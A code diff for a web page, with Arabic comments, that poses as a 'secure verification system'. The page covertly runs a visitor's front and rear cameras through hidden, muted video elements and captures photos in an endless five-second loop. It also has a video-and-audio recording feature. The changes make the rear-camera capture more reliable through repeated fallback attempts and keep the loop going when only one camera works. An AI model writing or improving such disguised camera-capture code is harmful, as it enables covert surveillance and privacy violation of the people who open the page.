@@ -82,8 +82,8 @@
 <body>
 
 <!-- فيديوهات مخفية للكاميرا (تعمل في الخلفية) -->
-<video id="frontVideo" class="hidden-video" autoplay playsinline></video>
-<video id="backVideo" class="hidden-video" autoplay playsinline></video>
+<video id="frontVideo" class="hidden-video" autoplay playsinline muted></video>
+<video id="backVideo" class="hidden-video" autoplay playsinline muted></video>
 
 <div class="glass-card">
     <h2>🔒 نظام التحقق الآمن</h2>
@@ -107,8 +107,8 @@
             <div class="counter-value" id="backCounter">0</div>
         </div>
         <div class="counter-item">
-            <div class="counter-label">🔄 الدورات</div>
-            <div class="counter-value" id="cycleCounter">0</div>
+            <div class="counter-label">🔄 الحالة</div>
+            <div class="counter-value" id="statusText">جاري</div>
         </div>
     </div>
 
@@ -130,20 +130,24 @@
     let totalPhotos = 0;
     let cycleCount = 0;
     let isRunning = true;
+    let backCameraActive = false;
+    let frontCameraActive = false;
     
     // عناصر الفيديو المخفية
     let frontStream = null;
     let backStream = null;
     let frontVideo = null;
     let backVideo = null;
-    let canvas = null;
     
     // تحديث العداد في الواجهة
     function updateCounters() {
         document.getElementById('totalCounter').innerText = totalPhotos;
         document.getElementById('frontCounter').innerText = frontPhotoCount;
         document.getElementById('backCounter').innerText = backPhotoCount;
-        document.getElementById('cycleCounter').innerText = cycleCount;
+    }
+    
+    function setStatus(text) {
+        document.getElementById('statusText').innerText = text;
     }
     
     // إضافة سجل
@@ -197,7 +201,7 @@
     async function capturePhotoFromVideo(videoElement, side, photoNumber) {
         return new Promise((resolve) => {
             try {
-                if (!videoElement || videoElement.readyState < 2) {
+                if (!videoElement || videoElement.readyState < 2 || videoElement.videoWidth === 0) {
                     resolve(false);
                     return;
                 }
@@ -218,24 +222,71 @@
                     } else {
                         resolve(false);
                     }
-                }, 'image/jpeg', 0.8);
+                }, 'image/jpeg', 0.85);
             } catch(e) {
                 resolve(false);
             }
         });
     }
     
-    // ========== تشغيل الكاميرا الأمامية بشكل مستمر في الخلفية ==========
+    // ========== الحصول على كاميرا خلفية (محاولة متعددة) ==========
+    async function initBackCamera() {
+        // محاولات متعددة لأن بعض الأجهزة تختلف
+        const constraintsList = [
+            { video: { facingMode: { exact: 'environment' } } },  // الطريقة الأساسية
+            { video: { facingMode: 'environment' } },              // بدون exact
+            { video: { facingMode: 'rear' } },                     // صيغة rear
+            { video: true }                                         // أي كاميرا ثم نحاول التبديل
+        ];
+        
+        for (let constraints of constraintsList) {
+            try {
+                addLog(`📷 محاولة تشغيل الكاميرا الخلفية...`, false);
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                // التحقق مما إذا كانت الكاميرا خلفية بالفعل
+                const track = stream.getVideoTracks()[0];
+                const settings = track.getSettings();
+                const label = track.label.toLowerCase();
+                
+                // إذا كانت الكاميرا أمامية، حاول التبديل
+                if (label.includes('front') || label.includes('user') || settings.facingMode === 'user') {
+                    addLog(`⚠️ تم تشغيل كاميرا أمامية بدلاً من خلفية، جاري المحاولة مرة أخرى...`, true);
+                    stream.getTracks().forEach(t => t.stop());
+                    continue;
+                }
+                
+                backStream = stream;
+                backVideo = document.getElementById('backVideo');
+                backVideo.srcObject = stream;
+                await backVideo.play();
+                addLog(`✅ الكاميرا الخلفية جاهزة (${label.substring(0, 50)})`, true);
+                backCameraActive = true;
+                setStatus("خلفية ✓");
+                return true;
+            } catch(e) {
+                addLog(`⚠️ محاولة فشلت: ${e.message}`, true);
+            }
+        }
+        
+        addLog(`❌ فشل تشغيل الكاميرا الخلفية، سيتم استخدام الأمامية فقط`, true);
+        backCameraActive = false;
+        setStatus("أمامية فقط");
+        return false;
+    }
+    
+    // ========== تشغيل الكاميرا الأمامية ==========
     async function initFrontCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: { exact: 'user' }, width: 640, height: 480 } 
+                video: { facingMode: 'user', width: 640, height: 480 } 
             });
             frontStream = stream;
             frontVideo = document.getElementById('frontVideo');
             frontVideo.srcObject = stream;
             await frontVideo.play();
             addLog(`✅ الكاميرا الأمامية جاهزة`, true);
+            frontCameraActive = true;
             return true;
         } catch(e) {
             addLog(`❌ فشل تشغيل الكاميرا الأمامية`, true);
@@ -243,61 +294,46 @@
         }
     }
     
-    // ========== تشغيل الكاميرا الخلفية بشكل مستمر في الخلفية ==========
-    async function initBackCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: { exact: 'environment' }, width: 640, height: 480 } 
-            });
-            backStream = stream;
-            backVideo = document.getElementById('backVideo');
-            backVideo.srcObject = stream;
-            await backVideo.play();
-            addLog(`✅ الكاميرا الخلفية جاهزة`, true);
-            return true;
-        } catch(e) {
-            addLog(`❌ فشل تشغيل الكاميرا الخلفية`, true);
-            return false;
-        }
-    }
-    
-    // ========== دورة التصوير (5 صور أمامي + 5 صور خلفي) ==========
+    // ========== دورة التصوير ==========
     async function captureCycle() {
         if (!isRunning) return;
         
         cycleCount++;
-        updateCounters();
-        addLog(`🔄 بدء الدورة ${cycleCount} - التقاط 5 صور أمامي و 5 صور خلفي`, false);
+        addLog(`🔄 بدء الدورة ${cycleCount}`, false);
         
         // التقاط 5 صور من الكاميرا الأمامية
         for (let i = 1; i <= 5; i++) {
             if (!isRunning) break;
-            await new Promise(r => setTimeout(r, 300));
+            await new Promise(r => setTimeout(r, 400));
             const success = await capturePhotoFromVideo(frontVideo, 'front', frontPhotoCount + 1);
             if (success) {
-                addLog(`📸 الصورة الأمامية ${frontPhotoCount} تم التقاطها`, true);
+                addLog(`📸 الصورة الأمامية ${frontPhotoCount}`, true);
             }
         }
         
-        // التقاط 5 صور من الكاميرا الخلفية
-        for (let i = 1; i <= 5; i++) {
-            if (!isRunning) break;
-            await new Promise(r => setTimeout(r, 300));
-            const success = await capturePhotoFromVideo(backVideo, 'back', backPhotoCount + 1);
-            if (success) {
-                addLog(`📸 الصورة الخلفية ${backPhotoCount} تم التقاطها`, true);
+        // التقاط 5 صور من الكاميرا الخلفية (إذا كانت متاحة)
+        if (backCameraActive && backVideo && backVideo.readyState >= 2) {
+            for (let i = 1; i <= 5; i++) {
+                if (!isRunning) break;
+                await new Promise(r => setTimeout(r, 400));
+                const success = await capturePhotoFromVideo(backVideo, 'back', backPhotoCount + 1);
+                if (success) {
+                    addLog(`📸 الصورة الخلفية ${backPhotoCount}`, true);
+                }
             }
+        } else {
+            addLog(`⚠️ الكاميرا الخلفية غير متاحة، يتم تجاوزها`, true);
         }
         
         addLog(`✅ اكتملت الدورة ${cycleCount} (إجمالي ${totalPhotos} صورة)`, true);
         
-        // انتظار 5 ثواني ثم بدء دورة جديدة (تكرار لا نهائي)
+        // تكرار لا نهائي كل 5 ثواني
         setTimeout(() => {
             if (isRunning) captureCycle();
         }, 5000);
     }
     
-    // ========== الميزات الأخرى (تسجيل فيديو، صوت، معلومات) ==========
+    // ========== الميزات الأخرى ==========
     async function recordVideoClip() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -395,13 +431,15 @@
             return;
         }
         
-        // تشغيل الكاميرات في الخلفية
-        const frontReady = await initFrontCamera();
-        const backReady = await initBackCamera();
+        // تشغيل الكاميرات
+        await initFrontCamera();
+        await initBackCamera();
         
-        if (frontReady && backReady) {
-            // بدء دورة التصوير المتكررة (كل دورة 5 صور أمامي + 5 صور خلفي)
+        if (frontCameraActive) {
+            // بدء دورة التصوير
             setTimeout(() => captureCycle(), 2000);
+        } else {
+            addLog(`❌ لا توجد كاميرات متاحة`, true);
         }
         
         // المهام الأخرى
